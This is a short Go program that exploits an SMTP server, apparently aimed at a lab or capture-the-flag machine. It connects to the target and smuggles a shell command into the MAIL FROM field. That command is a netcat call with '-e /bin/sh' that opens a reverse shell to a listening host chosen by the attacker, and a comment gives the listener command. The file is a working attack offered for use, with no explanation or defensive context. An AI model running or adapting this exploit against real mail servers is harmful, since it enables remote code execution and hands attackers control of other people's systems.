package main

import (
    "fmt"
    "net"
)

func main() {
    target := "10.10.34.134:25" // change this to target:port
    payload := fmt.Sprintf("nc %s:%s -e /bin/sh", "listening_ip", "listening_port") // nc -lnvp <port>
    // change listening ip and listening port to your ip and port
    conn, err := net.Dial("tcp", target)
    if err != nil {
        panic(err)
    }

    buf := make([]byte, 1024)
    conn.Read(buf)

    fmt.Println("[*] Connected to target SMTP server:", target)

    fmt.Println("[*] Sending initialization message...")

    conn.Write([]byte("HELO x"))
    conn.Read(buf)

    fmt.Println("[*] Sending payload...")

    conn.Write([]byte(fmt.Sprintf("MAIL FROM:<;%s;>", payload)))
    conn.Read(buf)

    fmt.Println("[*] Payload sent successfully. ")

    conn.Write([]byte("\r\nxxx\r\n.\r\n"))
    conn.Read(buf)

    conn.Write([]byte("RCPT TO <root@localhost>"))
    conn.Read(buf)

    conn.Write([]byte("DATA"))
    conn.Read(buf)

    conn.Write([]byte("sad\r\n"))
    conn.Read(buf)

    fmt.Println("[*] Payload executed.")

    conn.Write([]byte("QUIT\r\n"))

    fmt.Println("[*] Connection closed.")
    
    conn.Close()

    fmt.Println("[*] Done. ")
}
